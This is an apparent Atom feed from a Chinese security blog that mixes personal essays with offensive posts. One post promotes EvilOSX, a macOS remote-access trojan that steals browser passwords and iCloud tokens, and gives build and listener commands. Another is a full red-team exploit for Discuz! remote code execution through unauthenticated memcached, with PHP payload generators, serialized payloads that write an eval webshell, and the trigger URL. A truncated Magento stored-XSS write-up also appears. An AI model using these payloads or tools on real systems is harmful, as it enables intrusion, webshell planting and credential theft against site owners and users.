<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>卫星2队</title>
  
  <subtitle>心如花木，向阳而生</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://tycx2ry.github.io/"/>
  <updated>2018-03-03T08:52:33.439Z</updated>
  <id>https://tycx2ry.github.io/</id>
  
  <author>
    <name>L.N.</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>EvilOSX一个Mac平台的远程管理工具</title>
    <link href="https://tycx2ry.github.io/2018/03/03/EvilOSX%E4%B8%80%E4%B8%AAMac%E5%B9%B3%E5%8F%B0%E7%9A%84%E8%BF%9C%E7%A8%8B%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7/"/>
    <id>https://tycx2ry.github.io/2018/03/03/EvilOSX一个Mac平台的远程管理工具/</id>
    <published>2018-03-03T07:40:11.000Z</published>
    <updated>2018-03-03T08:52:33.439Z</updated>
    
    <content type="html"><![CDATA[<p><img src="/2018/03/03/EvilOSX一个Mac平台的远程管理工具/1.png" alt="1"></p><h3 id="0x00-工具简述"><a href="#0x00-工具简述" class="headerlink" title="0x00 工具简述"></a>0x00 工具简述</h3><p>EvilOSX 是一个还算好用的Mac平台的远程管理工具。测试了下有一些小bug，我修复了bug并提交代码给作者。</p><p><em>下载地址</em>：<a href="https://github.com/Marten4n6/EvilOSX" target="_blank" rel="noopener">https://github.com/Marten4n6/EvilOSX</a></p><h3 id="0x01-功能简介"><a href="#0x01-功能简介" class="headerlink" title="0x01 功能简介"></a>0x01 功能简介</h3><ul><li>简单命令终端</li><li>免杀 (OpenSSL <a href="https://en.wikipedia.org/wiki/Advanced_Encryption_Standard" target="_blank" rel="noopener">AES-256</a> 加密 payloads, <a href="https://en.wikipedia.org/wiki/HTTPS" target="_blank" rel="noopener">HTTPS</a> 传输)</li><li>多线程</li><li>client端无依耐库 (原生python)</li><li>持久化</li><li>功能模块化</li><li>Chrome密码偷取</li><li>iCloud tokens 和 contacts偷取</li><li>通过 iTunes钓鱼获取icloud密码</li><li>文件下载上传</li><li>摄像头拍照</li><li>枚举iTunes iOS 备份</li><li>浏览器历史偷取(Chrome and Safari)</li><li>尝试本地提权漏洞获取root权限</li><li>闲时休眠功能(没有命令传输时候client进入60s休眠)</li></ul><h3 id="0x03-使用简介"><a href="#0x03-使用简介" class="headerlink" title="0x03 使用简介"></a>0x03 使用简介</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 安装 urwid (required for the server GUI)</span></span><br><span class="line">$ sudo pip install urwid</span><br><span class="line"></span><br><span class="line"><span class="comment"># 下载工具</span></span><br><span class="line">$ git <span class="built_in">clone</span> https://github.com/Marten4n6/EvilOSX</span><br><span class="line"></span><br><span class="line"><span class="comment"># Go into the repository</span></span><br><span class="line">$ <span class="built_in">cd</span> EvilOSX</span><br><span class="line"></span><br><span class="line"><span class="comment"># 生成client</span></span><br><span class="line">$ python builder.py</span><br><span class="line"></span><br><span class="line"><span class="comment"># 启动监听</span></span><br><span class="line">$ python server/server.py</span><br><span class="line"></span><br><span class="line"><span class="comment"># 最后在client端电脑上运行生成的程序</span></span><br></pre></td></tr></table></figure><p><img src="/2018/03/03/EvilOSX一个Mac平台的远程管理工具/2.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;img src=&quot;/2018/03/03/EvilOSX一个Mac平台的远程管理工具/1.png&quot; alt=&quot;1&quot;&gt;&lt;/p&gt;
&lt;h3 id=&quot;0x00-工具简述&quot;&gt;&lt;a href=&quot;#0x00-工具简述&quot; class=&quot;headerlink&quot; title=&quot;0x00 工具
      
    
    </summary>
    
      <category term="红队工具集" scheme="https://tycx2ry.github.io/categories/%E7%BA%A2%E9%98%9F%E5%B7%A5%E5%85%B7%E9%9B%86/"/>
    
    
      <category term="红队,red team,工具,OSX,木马,远程控制,远程管理" scheme="https://tycx2ry.github.io/tags/%E7%BA%A2%E9%98%9F-red-team-%E5%B7%A5%E5%85%B7-OSX-%E6%9C%A8%E9%A9%AC-%E8%BF%9C%E7%A8%8B%E6%8E%A7%E5%88%B6-%E8%BF%9C%E7%A8%8B%E7%AE%A1%E7%90%86/"/>
    
  </entry>
  
  <entry>
    <title>Discuz!因memcached未授权访问导致的RCE</title>
    <link href="https://tycx2ry.github.io/2018/02/26/Discuz-%E5%9B%A0memcached%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%AF%BC%E8%87%B4%E7%9A%84RCE/"/>
    <id>https://tycx2ry.github.io/2018/02/26/Discuz-因memcached未授权访问导致的RCE/</id>
    <published>2018-02-26T10:23:23.000Z</published>
    <updated>2018-03-03T08:49:55.298Z</updated>
    
    <content type="html"><![CDATA[<p><strong>一、前言</strong></p><p>​        这个漏洞大家一定不陌生，在16年的时候关于discuz! + ssrf +memcached的RCE漏洞让大家都很惊艳，一年过去了这个漏洞的修复情况又是怎样的呢？</p><p><strong>二、漏洞简述</strong></p><p>​        这个漏洞大致利用过程是这样的：利用discuz!的ssrf漏洞，利用gopher协议写入payload到memcached，然后请求特定链接导致代码执行漏洞。</p><p>可以看出漏洞利用两个关键点：1.ssrf漏洞 2.代码执行漏洞</p><p>利用ssrf漏洞是要向memcached中写入payload，我们抽象的看ssrf只是写入payload的一种方式。如果memcached的11211端口绑定到了外网并且可以未授权访问，ssrf漏洞我们也可以不使用了。今天在做一个渗透测试的时候遇到了此种情况。</p><p>因此，现在我的关注点是代码执行漏洞。如果代码执行漏洞没有修复，我就可以利用memcached未授权漏洞写入payload，使用代码执行漏洞获取webshell。</p><p><strong>三、discuz！代码执行漏洞分析</strong></p><p>​        漏洞利用有两个版本，一个是老版本，一个是新版本，discuz！虽然已经是x3.4，代码也发生了变化，漏洞确是任然没有修复。</p><p>漏洞利用代码流程逻辑：</p><p>访问：forum.php?mod=ajax&amp;inajax=yes&amp;action=getthreadtypes</p><p>./source/module/forum/forum_ajax.php</p><p><img src="/2018/02/26/Discuz-因memcached未授权访问导致的RCE/1.jpg" alt="1"></p><p>./template/default/common/footer_ajax.htm</p><p><img src="/2018/02/26/Discuz-因memcached未授权访问导致的RCE/2.png" alt="2"></p><p>./source/function/function_core.php</p><p><img src="/2018/02/26/Discuz-因memcached未授权访问导致的RCE/3.png" alt="3"></p><p>./source/function/function_core.php</p><p><img src="/2018/02/26/Discuz-因memcached未授权访问导致的RCE/4.png" alt="img"></p><p>最后利用preg_replace函数/e参数的代码执行特性完成了漏洞利用的全部过程。</p><p>以上是老版本代码，在网上已经有一些分析了，在这里简述一些，重点是payload的完整性使用。网上文章大部分在payload部分都只是验证性演示。作为一名红队渗透测试人员，验证性payload肯定是不能再实际渗透测试活动中使用的。</p><p><strong>四、漏洞利用流程</strong></p><ol><li><p>老版本漏洞利用流程：</p><p>生成payload</p></li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$payload[<span class="string">'output'</span>][<span class="string">'preg'</span>][<span class="string">'search'</span>][<span class="string">'plugins'</span>]= <span class="string">"/.*/e"</span>;</span><br><span class="line">$payload[<span class="string">'output'</span>][<span class="string">'preg'</span>][<span class="string">'replace'</span>][<span class="string">'plugins'</span>]= <span class="string">"file_put_contents('./data/cache/ln.php','&lt;?phpeval(\$_POST[x]);?&gt;');"</span>;</span><br><span class="line">$payload[<span class="string">'rewritestatus'</span>][<span class="string">'plugins'</span>]= <span class="number">1</span>;</span><br><span class="line">echoserialize($payload);</span><br></pre></td></tr></table></figure><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:2:&#123;s:6:"output";a:1:&#123;s:4:"preg";a:2:&#123;s:6:"search";a:1:&#123;s:7:"plugins";s:5:"/.*/e";&#125;s:7:"replace";a:1:&#123;s:7:"plugins";s:68:"file_put_contents('./data/cache/ln.php','&lt;?phpeval($_POST[x]);?&gt;');";&#125;&#125;&#125;s:13:"rewritestatus";a:1:&#123;s:7:"plugins";i:1;&#125;&#125;</span><br></pre></td></tr></table></figure><p>​    然后telnet链接memcached</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">telnet 1.1.1.1 11211</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set xxxxxx_setting 1 0 yyy    //xxxx为前缀，discuz定义的，可以使用stats cachedump 命令查看。yyy为payload长度。</span><br></pre></td></tr></table></figure><p><img src="/2018/02/26/Discuz-因memcached未授权访问导致的RCE/5.png" alt="img"></p><p>最后访问forum.php?mod=ajax&amp;inajax=yes&amp;action=getthreadtypes，shell生成/data/cache/ln.php。</p><ol><li>网上给的修复代码，完全没有作用</li></ol><p>​        网上大部分修复是这样的 <a href="https://yq.aliyun.com/ziliao/5533" target="_blank" rel="noopener">https://yq.aliyun.com/ziliao/5533</a>。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">"(/|#|\+|%).*(/|#|\+|%)e"</span>, $_G[<span class="string">'setting'</span>][<span class="string">'output'</span>][<span class="string">'preg'</span>][<span class="string">'search'</span>]) !== <span class="keyword">FALSE</span>) &#123; <span class="keyword">die</span>(<span class="string">"request error"</span>); &#125;</span><br></pre></td></tr></table></figure><p>​    这个修复完全没有作用，无效修复，preg_match的正则根本匹配不到/.*/e。注意看，正则代码没有给分隔符，而(成了分隔符，让正则失去了本来的作用，如果加上分隔符，正则匹配任何字符，将影响代码正常功能。</p><p><img src="/2018/02/26/Discuz-因memcached未授权访问导致的RCE/11.png" alt="img"></p><p><strong>五、最新版本Discuz x3.4漏洞依旧存在</strong></p><ol><li><p>代码变化，漏洞依旧</p><p>​漏洞点代码已经被更新，但是漏洞并没有被修复，这种代码更新应该是为了适应php版本更新，因为php5.5以后preg_replace的/e参数被废弃，官方建议使用preg_replace_callback。</p></li></ol><p><img src="/2018/02/26/Discuz-因memcached未授权访问导致的RCE/6.png" alt="img"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">foreach</span>($_G[<span class="string">'setting'</span>][<span class="string">'output'</span>][<span class="string">'preg'</span>][<span class="string">'search'</span>]<span class="keyword">as</span> $key =&gt; $value) &#123;</span><br><span class="line">$content= preg_replace_callback($value, create_function(<span class="string">'$matches'</span>,<span class="string">'return'</span>.$_G[<span class="string">'setting'</span>][<span class="string">'output'</span>][<span class="string">'preg'</span>][<span class="string">'replace'</span>][$key].<span class="string">';'</span>), $content);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>漏洞函数变成了create_function,这个函数大家都知道也是危险函数，可以造成代码执行漏洞。</p><ol><li>新版本漏洞利用流程</li></ol><p>生成payload有点变化(ps:只是少了一个e)</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$payload[<span class="string">'output'</span>][<span class="string">'preg'</span>][<span class="string">'search'</span>][<span class="string">'plugins'</span>]= <span class="string">"/.*/"</span>;</span><br><span class="line">$payload[<span class="string">'output'</span>][<span class="string">'preg'</span>][<span class="string">'replace'</span>][<span class="string">'plugins'</span>]= <span class="string">"file_put_contents('./data/cache/ln.php','&lt;?phpeval(\$_POST[x]);?&gt;');"</span>;</span><br><span class="line">$payload[<span class="string">'rewritestatus'</span>][<span class="string">'plugins'</span>]= <span class="number">1</span>;</span><br><span class="line">echoserialize($payload);</span><br></pre></td></tr></table></figure><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:2:&#123;s:6:"output";a:1:&#123;s:4:"preg";a:2:&#123;s:6:"search";a:1:&#123;s:7:"plugins";s:4:"/.*/";&#125;s:7:"replace";a:1:&#123;s:7:"plugins";s:68:"file_put_contents('./data/cache/ln.php','&lt;?phpeval($_POST[x]);?&gt;');";&#125;&#125;&#125;s:13:"rewritestatus";a:1:&#123;s:7:"plugins";i:1;&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="/2018/02/26/Discuz-因memcached未授权访问导致的RCE/7.png" alt="img"></p><p>访问:forum.php?mod=ajax&amp;inajax=yes&amp;action=getthreadtypes</p><p><img src="/2018/02/26/Discuz-因memcached未授权访问导致的RCE/8.png" alt="img"></p><p>最后一定要恢复缓存</p><p>Delete Vtfbsm_setting</p><p>成功写入文件</p><p><img src="/2018/02/26/Discuz-因memcached未授权访问导致的RCE/9.png" alt="img"></p><p><strong>四、总结</strong></p><p>​    直到最新版本discuz也没有修复这个漏洞，当初的ssrf结合memcached的漏洞，discuz只看到了ssrf漏洞，并没有留意到这个代码执行的漏洞。通过漏洞的抽象思维，我们知道控制memcached的方式不仅仅只有ssrf，再进一步到代码层，控制$G全局变量的方式也不仅仅只有memcached。</p><p><img src="/2018/02/26/Discuz-因memcached未授权访问导致的RCE/10.png" alt="img"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;strong&gt;一、前言&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;​        这个漏洞大家一定不陌生，在16年的时候关于discuz! + ssrf +memcached的RCE漏洞让大家都很惊艳，一年过去了这个漏洞的修复情况又是怎样的呢？&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;二、
      
    
    </summary>
    
      <category term="技术文章" scheme="https://tycx2ry.github.io/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E7%AB%A0/"/>
    
    
      <category term="RCE,discuz!,memcached,未授权访问" scheme="https://tycx2ry.github.io/tags/RCE-discuz-memcached-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/"/>
    
  </entry>
  
  <entry>
    <title>记录算是一种宣泄</title>
    <link href="https://tycx2ry.github.io/2017/06/20/e8-ae-b0-e5-bd-95-e7-ae-97-e6-98-af-e4-b8-80-e7-a7-8d-e5-ae-a3-e6-b3-84/"/>
    <id>https://tycx2ry.github.io/2017/06/20/e8-ae-b0-e5-bd-95-e7-ae-97-e6-98-af-e4-b8-80-e7-a7-8d-e5-ae-a3-e6-b3-84/</id>
    <published>2017-06-19T20:20:02.000Z</published>
    <updated>2018-02-26T05:36:35.275Z</updated>
    
    <content type="html"><![CDATA[<p>时间2017年6月20日，今晚看了一部小说，有点虐啊，激活了我感性的思维，毫无睡意。</p><p>不知从何时起开始惧怕，惧怕悲剧，惧怕失去，惧怕让自己久久不能释怀的人和事，惧怕回忆。</p><p>掌控欲强的人，惧怕超出控制。</p><p>情感的宣泄最是让人惧怕，压抑着，无处找宣泄的出口。</p><p>不知道该追求什么。</p><p>自以为脱离迷茫的年纪，反而被迷茫了。</p><p>思虑太多，辨析太明，最后让自己无路可走。</p><p>认真做事，一件一件，试试走走</p><p>管那么多干嘛。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;时间2017年6月20日，今晚看了一部小说，有点虐啊，激活了我感性的思维，毫无睡意。&lt;/p&gt;
&lt;p&gt;不知从何时起开始惧怕，惧怕悲剧，惧怕失去，惧怕让自己久久不能释怀的人和事，惧怕回忆。&lt;/p&gt;
&lt;p&gt;掌控欲强的人，惧怕超出控制。&lt;/p&gt;
&lt;p&gt;情感的宣泄最是让人惧怕，压抑着
      
    
    </summary>
    
      <category term="琐碎杂事" scheme="https://tycx2ry.github.io/categories/%E7%90%90%E7%A2%8E%E6%9D%82%E4%BA%8B/"/>
    
    
  </entry>
  
  <entry>
    <title>日常的一些闲聊</title>
    <link href="https://tycx2ry.github.io/2016/10/31/e6-97-a5-e5-b8-b8-e7-9a-84-e4-b8-80-e4-ba-9b-e9-97-b2-e8-81-8a/"/>
    <id>https://tycx2ry.github.io/2016/10/31/e6-97-a5-e5-b8-b8-e7-9a-84-e4-b8-80-e4-ba-9b-e9-97-b2-e8-81-8a/</id>
    <published>2016-10-31T15:25:06.000Z</published>
    <updated>2018-02-26T06:03:45.321Z</updated>
    
    <content type="html"><![CDATA[<p>最近看了很多东西，值得拿出来一说的有两部美剧《the night of》《百年酒馆》，喜欢《the night of》里面的闲散镜头，每一个定格的镜头都给我一种“这是一张很文艺的照片”的感觉，说不出的美感。有人说这个时代缺少好的编剧，其实我更觉得这个时代缺少思考。《百年酒馆》是一部让人笑不出来的喜剧，每个角色的每一段独白都让人深思，总是留人一种悲而不落泪的感觉，把你的情绪一直压抑着，偶尔给你释放一下，又继续压抑你，直到结局，一下子让你爆发出来，留给你一种说不出的明悟。似乎我是懂了什么。</p><p>乌云的离开于我而言依旧是一场梦，曾经我也以为我虽苟活于世，却还是有自己的坚持。</p><p>没有啥豪言壮语，只学会了家长里短</p><p>一人一屋一车，日出而作，日落而息</p><p>做的张三李四，也装的赵钱孙李</p><p>狼贝为兼</p><p>依旧喜欢《晓松奇谈》、《一席演讲》，看看动漫，看看公开课，找找最近又有哪些新人出道，可有良作。</p><p>学学篆刻，学学书法，拨几下吉他，可能我还得学学围棋，搞几幅涂鸦，才能筹够琴棋书画。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;最近看了很多东西，值得拿出来一说的有两部美剧《the night of》《百年酒馆》，喜欢《the night of》里面的闲散镜头，每一个定格的镜头都给我一种“这是一张很文艺的照片”的感觉，说不出的美感。有人说这个时代缺少好的编剧，其实我更觉得这个时代缺少思考。《百年酒馆
      
    
    </summary>
    
      <category term="技术文章" scheme="https://tycx2ry.github.io/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E7%AB%A0/"/>
    
    
  </entry>
  
  <entry>
    <title>感谢我生命中曾经有你</title>
    <link href="https://tycx2ry.github.io/2016/04/30/e6-84-9f-e8-b0-a2-e6-88-91-e7-94-9f-e5-91-bd-e4-b8-ad-e6-9b-be-e7-bb-8f-e6-9c-89-e4-bd-a0/"/>
    <id>https://tycx2ry.github.io/2016/04/30/e6-84-9f-e8-b0-a2-e6-88-91-e7-94-9f-e5-91-bd-e4-b8-ad-e6-9b-be-e7-bb-8f-e6-9c-89-e4-bd-a0/</id>
    <published>2016-04-30T13:07:45.000Z</published>
    <updated>2018-02-26T06:03:13.866Z</updated>
    
    <summary type="html">
    
    </summary>
    
      <category term="技术文章" scheme="https://tycx2ry.github.io/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E7%AB%A0/"/>
    
    
  </entry>
  
  <entry>
    <title>无题</title>
    <link href="https://tycx2ry.github.io/2016/04/29/e6-97-a0-e9-a2-98/"/>
    <id>https://tycx2ry.github.io/2016/04/29/e6-97-a0-e9-a2-98/</id>
    <published>2016-04-28T20:00:53.000Z</published>
    <updated>2018-02-26T06:03:37.492Z</updated>
    
    <content type="html"><![CDATA[<p>现在是2016年4月29日凌晨3点35分，今夜无眠。</p><p>很久不写博客，读书变少，日子变长。</p><p>活的久，心脏跳动毫无规律。</p><p>品星空的轰鸣，思灯下的昏黄。</p><p>生命，刻意描绘，失去寓意。</p><p>我想，化为灰烬，以此为墨。</p><p>再图，白纸一张，重涂此生。</p><p>不求春暖花开，只为面朝大海。</p><p>孤一世清高，独一生快意。</p><p>&nbsp;</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;现在是2016年4月29日凌晨3点35分，今夜无眠。&lt;/p&gt;
&lt;p&gt;很久不写博客，读书变少，日子变长。&lt;/p&gt;
&lt;p&gt;活的久，心脏跳动毫无规律。&lt;/p&gt;
&lt;p&gt;品星空的轰鸣，思灯下的昏黄。&lt;/p&gt;
&lt;p&gt;生命，刻意描绘，失去寓意。&lt;/p&gt;
&lt;p&gt;我想，化为灰烬，以此为墨。&lt;
      
    
    </summary>
    
      <category term="技术文章" scheme="https://tycx2ry.github.io/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E7%AB%A0/"/>
    
    
  </entry>
  
  <entry>
    <title>多线程HTTPbanner扫描v1.2</title>
    <link href="https://tycx2ry.github.io/2016/04/20/e5-a4-9a-e7-ba-bf-e7-a8-8bhttpbanner-e6-89-ab-e6-8f-8fv1-2/"/>
    <id>https://tycx2ry.github.io/2016/04/20/e5-a4-9a-e7-ba-bf-e7-a8-8bhttpbanner-e6-89-ab-e6-8f-8fv1-2/</id>
    <published>2016-04-20T09:36:26.000Z</published>
    <updated>2018-02-26T06:02:50.483Z</updated>
    
    <content type="html"><![CDATA[<p>修复了一些bug，加了跳转和https的支持</p><p>下载：<a href="http://k1p4ss-wordpress.stor.sinaapp.com/uploads/2016/04/HBS.exe" target="_blank" rel="noopener">HBS</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;修复了一些bug，加了跳转和https的支持&lt;/p&gt;
&lt;p&gt;下载：&lt;a href=&quot;http://k1p4ss-wordpress.stor.sinaapp.com/uploads/2016/04/HBS.exe&quot; target=&quot;_blank&quot; rel=&quot;noopener
      
    
    </summary>
    
      <category term="技术文章" scheme="https://tycx2ry.github.io/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E7%AB%A0/"/>
    
    
  </entry>
  
  <entry>
    <title>magento存储型xss（Magento CE </title>
    <link href="https://tycx2ry.github.io/2016/01/25/magento-e5-ad-98-e5-82-a8-e5-9e-8bxss-ef-bc-88magento-ce/"/>
    <id>https://tycx2ry.github.io/2016/01/25/magento-e5-ad-98-e5-82-a8-e5-9e-8bxss-ef-bc-88magento-ce/</id>
    <published>2016-01-25T15:00:34.000Z</published>
    <updated>2018-02-26T05:36:35.273Z</updated>
    
    <content type="html"><![CDATA[<div><div>0x00 Magento简介</div><div><br></div><div><span style="font-size: 14pt; line-height: 1;">&nbsp; &nbsp;&nbsp;</span><span style="font-size: 14pt; line-height: 1;">&nbsp; &nbsp;&nbsp;</span><span style="font-size: 14pt; line-height: 1;">Magento （麦进斗） 是一套专业开源的电子商务系统。传说中的全球第一的电子商务系统。Magento设计得非常灵活，具有模块化架构体系和丰富的功能。</span><span style="font-size: 14pt; line-height: 1;">易于与第三方应用系统无缝集成。其面向企业级应用，可处理各方面的需求，以及建设一个多种用途和适用面的电子商务网站。&nbsp;</span><span style="font-size: 14pt; line-height: 1;">包括购物、航运、产品评论等等，充分利用开源的特性，提供代码库的开发，非常规范的标准，易于与第三方应用系统无缝集成。</span><span style="font-size: 14pt; line-height: 1;">一款新的专业开源电子商务平台，采用php进行开发，使用Zend Framwork框架。设计得非常灵活，具有模块化架构体系和丰富的功能。</span><span style="font-size: 14pt; line-height: 1;">易于与第三方应用系统无缝集成。在设计上，包含相当全面，以模块化架构体系，让应用组合变得相当灵活，功能也相当丰富。</span><span style="font-size: 14pt; line-height: 1;">为了打开盈利途径，Magento同时具备收费的企业版本，积极谋求合作和第三方整合的工具，比如电子支付平台等。</span></div><a id="more"></a><div><br></div><div><br></div><div>0x02 描述</div><div><span class="Apple-tab-span" style="white-space:pre">    </span>在2016年1月20日，Magento发不了SUPEE-7405补丁，修补了一个高危存储型xss漏洞。攻击者只需要注册一个帐号，修改自己邮箱为攻击代码，并利用该账户提交一个订单，当管理员在后台查看此订单的时候，恶意脚本代码将被执行。</div><div><br></div><div><br></div><div>0x03 验证性测试</div><div><span class="Apple-tab-span" style="white-space:pre">    </span>第一步，首先我们注册一个帐号，然后修改邮箱设置，发现有js邮箱验证，通过抓包改包工具成功修改邮箱为我们的恶意代码</div><div><span style="font-size: 14pt; line-height: 1;">&nbsp; &nbsp;&nbsp;</span><span style="font-size: 14pt; line-height: 1;">&nbsp; &nbsp;&nbsp;</span><span style="font-size: 14pt; line-height: 1;">&nbsp;</span><img src="http://k1p4ss-wordpress.stor.sinaapp.com/uploads/2016/01/wpid-697243fc99e2651154e6088630999881_14172331-3ec0-4340-8850-8a29a9652c3b.png" alt=""></div><div><br></div><div><span class="Apple-tab-span" style="white-space:pre">    </span><img src="http://k1p4ss-wordpress.stor.sinaapp.com/uploads/2016/01/wpid-697243fc99e2651154e6088630999881_2c0155ea-b113-43ab-90aa-b8c0a4cd87c1.png" alt=""></div><div><div><span style="font-size: 14pt; line-height: 1;">&nbsp; &nbsp;&nbsp;</span><span style="font-size: 14pt; line-height: 1;">&nbsp; &nbsp;&nbsp;</span><span style="font-size: 14pt; line-height: 1;">第二步，浏览商品，提交订单</span></div><div>&nbsp; &nbsp;&nbsp;<span style="font-size: 14pt; line-height: 1;">&nbsp; &nbsp;&nbsp;</span></div><div>&nbsp; &nbsp;&nbsp;<span style="font-size: 14pt; line-height: 1;">&nbsp; &nbsp;&nbsp;</span><img src="http://k1p4ss-wordpress.stor.sinaapp.com/uploads/2016/01/wpid-697243fc99e2651154e6088630999881_2f996f18-3c23-4a53-8707-85f08dc0f930.png" alt=""><span style="font-size: 14pt; line-height: 1;"><br></span></div><div><span style="font-size: 14pt; line-height: 1;"><br></span></div><div><span style="font-size: 14pt; line-height: 1;">&nbsp; &nbsp;&nbsp;</span><span style="font-size: 14pt; line-height: 1;">&nbsp; &nbsp;&nbsp;</span><span style="font-size: 14pt; line-height: 1;">第三步，管理员浏览后台，查看订单详情，出发漏洞</span></div></div><div>&nbsp; &nbsp;&nbsp;<span style="font-size: 14pt; line-height: 1;">&nbsp; &nbsp;&nbsp;</span><br></div><div><span style="font-size: 14pt; line-height: 1;">&nbsp;</span><span style="font-size: 14pt; line-height: 1;">&nbsp; &nbsp;&nbsp;</span><span style="font-size: 14pt; line-height: 1;">&nbsp; &nbsp;&nbsp;</span><img src="http://k1p4ss-wordpress.stor.sinaapp.com/uploads/2016/01/wpid-697243fc99e2651154e6088630999881_356e4fbf-d803-46cf-b7f1-17238c2bc530.png" alt=""><span style="font-size: 14pt; line-height: 1;">&nbsp; &nbsp;&nbsp;</span></div><div><span style="font-size: 14pt; line-height: 1;"><br></span></div><div>0x04 代码分析</div><div>&nbsp; &nbsp;&nbsp;<span style="font-size: 14pt; line-height: 1;">&nbsp; &nbsp; 恶意数据执行流程：</span><br></div><div>&nbsp; &nbsp;&nbsp;<span style="font-size: 14pt; line-height: 1;">&nbsp; &nbsp;&nbsp;</span><span style="font-size: 14pt; line-height: 1;">&nbsp; &nbsp;&nbsp;</span><span style="font-size: 14pt; line-height: 1;">&nbsp;</span><span style="font-size: 14pt; line-height: 1;">D:\WWW\magento\</span><span style="font-size: 14pt; line-height: 1;">app\code\core\Mage\Customer\controllers\AccountController.php &nbsp;</span></div><div><span style="font-size: 14pt; line-height: 1;">&nbsp; &nbsp;&nbsp;</span><span style="font-size: 14pt; line-height: 1;">&nbsp; &nbsp;&nbsp;</span><span style="font-size: 14pt; line-height: 1;">&nbsp; &nbsp;&nbsp;</span><span style="font-size: 14pt; line-height: 1;">&nbsp; &nbsp;&nbsp;</span><span style="font-size: 14pt; line-height: 1;">&nbsp; &nbsp;&nbsp;</span><span style="font-size: 14pt; line-height: 1;">&nbsp; &nbsp;&nbsp;</span><span style="font-size: 14pt; line-height: 1;">—-&gt;</span><span style="font-size: 14pt; line-height: 1;">public function editPostAction()</span></div><div>&nbsp; &nbsp;&nbsp;<span style="font-size: 14pt; line-height: 1;">&nbsp; &nbsp;&nbsp;</span><span style="font-size: 14pt; line-height: 1;">&nbsp; &nbsp;&nbsp;</span><span style="font-size: 14pt; line-height: 1;">&nbsp;</span><span style="font-size: 14pt; line-height: 1;"><br></span></div><div>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;D:\WWW\magento\app\code\core\Mage\Eav\Model\Form.php&nbsp;</div><div><span style="font-size: 14pt; line-height: 1;">&nbsp; &nbsp;&nbsp;</span><span style="font-size: 14pt; line-height: 1;">&nbsp; &nbsp;&nbsp;</span><span style="font-size: 14pt; line-height: 1;">&nbsp; &nbsp;&nbsp;</span><span style="font-size: 14pt; line-height: 1;">&nbsp; &nbsp;&nbsp;</span><span style="font-size: 14pt; line-height: 1;">&nbsp; &nbsp;&nbsp;</span><span style="font-size: 14pt; line-height: 1;">&nbsp; &nbsp; —–&gt;</span>public function validateData(array $data)<span style="font-size: 14pt; line-height: 1;">&nbsp;</span></div><div><span style="font-size: 14pt; line-height: 1;"><br></span></div><div><span style="font-size: 14pt; line-height: 1;">&nbsp; &nbsp;&nbsp;</span><span style="font-size: 14pt; line-height: 1;">&nbsp; &nbsp;&nbsp;</span><span style="font-size: 14pt; line-height: 1;">&nbsp; &nbsp; &nbsp;</span>D:\WWW\magento\lib\Zend\Validate\EmailAddress.php</div><div><span style="font-size: 14pt; line-height: 1;">&nbsp; &nbsp;&nbsp;</span><span style="font-size: 14pt; line-height: 1;">&nbsp; &nbsp;&nbsp;</span><span style="font-size: 14pt; line-height: 1;">&nbsp; &nbsp;&nbsp;</span><span style="font-size: 14pt; line-height: 1;">&nbsp;</span><img src="http://k1p4ss-wordpress.stor.sinaapp.com/uploads/2016/01/wpid-697243fc99e2651154e6088630999881_27c7e28f-518f-46a0-af39-0555932a21b7.png" alt=""><span style="font-size: 14pt; line-height: 1;">&nbsp; &nbsp;</span><span style="font-size: 14pt; line-height: 